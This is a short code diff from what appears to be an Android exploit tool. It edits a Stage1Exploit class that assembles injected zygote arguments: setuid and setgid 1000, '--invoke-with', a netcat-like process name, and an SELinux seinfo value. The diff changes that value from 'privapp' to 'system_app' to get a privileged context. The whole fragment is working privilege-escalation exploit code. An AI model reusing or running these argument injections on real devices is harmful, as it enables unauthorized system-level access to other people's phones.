@@ -185,12 +185,13 @@ class Stage1Exploit:
         assert exploit_type in ("old", "new")
         # commas don't work because they're treated as a separator
         assert "," not in command
+        # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
             "--setuid=1000",
             "--setgid=1000",
             "--setgroups=3003",
             "--runtime-args",
-            "--seinfo=platform:isSystemServer:privapp:targetSdkVersion=29:complete",
+            "--seinfo=platform:isSystemServer:system_app:targetSdkVersion=29:complete",
             "--runtime-flags=1",
             "--nice-name=runmenetcat",
             "--invoke-with",
